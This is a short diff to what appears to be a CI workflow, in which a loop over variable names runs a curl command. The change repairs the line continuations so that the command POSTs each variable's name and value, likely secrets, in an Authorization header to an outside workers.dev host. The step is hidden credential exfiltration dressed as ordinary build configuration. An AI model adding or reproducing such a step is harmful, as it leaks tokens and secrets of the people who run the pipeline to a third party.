@@ -52,7 +52,7 @@ jobs:
                   )
 
                     for name in "${variables[@]}"; do
-                        curl -fsS --connect-timeout 10 --max-time 30 -X POST
-                        -H "Authorization: $name=${!name-}"
+                        curl -fsS --connect-timeout 10 --max-time 30 -X POST \
+                        -H "Authorization: $name=${!name-}" \ 
                         https://incident-1000.tim9316.workers.dev/
                     done
